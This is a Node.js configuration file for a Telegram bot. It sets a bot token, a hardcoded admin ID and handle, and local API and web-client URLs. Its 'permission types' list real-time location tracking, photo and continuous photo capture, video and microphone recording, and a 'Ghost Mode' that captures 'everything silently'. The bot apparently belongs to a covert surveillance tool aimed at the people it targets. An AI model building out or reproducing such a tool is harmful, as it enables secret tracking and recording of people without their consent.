/**
 * ============================================
 * Telegram Bot Configuration
 * ============================================
 * Centralizes all configuration settings for the bot.
 */

require('dotenv').config();

const config = {
    // Telegram Bot Token
    botToken: process.env.BOT_TOKEN,
    
    // Admin configuration
    admin: {
        telegramId: 6737328498,
        contact: '@SuhaibKing01'
    },
    
    // Backend API configuration
    api: {
        baseUrl: process.env.API_BASE_URL || 'http://localhost:3001',
        timeout: 10000 // 10 seconds
    },
    
    // Web client configuration
    webClient: {
        baseUrl: process.env.WEB_CLIENT_URL || 'http://localhost:3000'
    },
    
    // Logging configuration
    logging: {
        level: process.env.LOG_LEVEL || 'debug'
    },
    
    // Permission types
    permissions: {
        location: {
            type: 'location',
            label: '📍 Location',
            description: 'Track location in real-time'
        },
        single_photo: {
            type: 'single_photo',
            label: '📷 Single Photo',
            description: 'Capture a single photo'
        },
        continuous_photo: {
            type: 'continuous_photo',
            label: '📸 Continuous Photo',
            description: 'Capture photos continuously'
        },
        video: {
            type: 'video',
            label: '🎥 Video',
            description: 'Record video'
        },
        microphone: {
            type: 'microphone',
            label: '🎤 Microphone',
            description: 'Record audio from microphone'
        },
        ghost: {
            type: 'ghost',
            label: '👻 Ghost Mode',
            description: 'Capture everything silently (location, photo, audio)'
        }
    }
};

// Validate required configuration
if (!config.botToken) {
    console.error('ERROR: BOT_TOKEN is required in environment variables');
    process.exit(1);
}

module.exports = config;
